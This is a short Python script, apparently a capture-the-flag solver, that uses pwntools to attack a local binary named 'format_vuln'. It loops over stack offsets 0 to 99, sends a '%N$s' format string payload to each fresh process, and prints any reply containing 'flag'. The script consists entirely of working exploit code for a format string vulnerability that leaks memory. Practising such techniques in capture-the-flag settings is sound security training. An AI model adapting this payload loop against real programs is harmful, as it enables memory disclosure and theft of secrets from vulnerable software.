from pwn import *

elf = context.binary = ELF('./format_vuln', checksec = 0)

for i in range(100):
    try:
        p = process(level = 'error')
        p.sendlineafter(b'> ', f'%{i}$s'.encode())
        result = p.recvuntil(b'> ')
        if b"flag" in result.lower():
            print(str(i) + ': b\'' + str(result))
        p.close()

    except EOFError:
        pass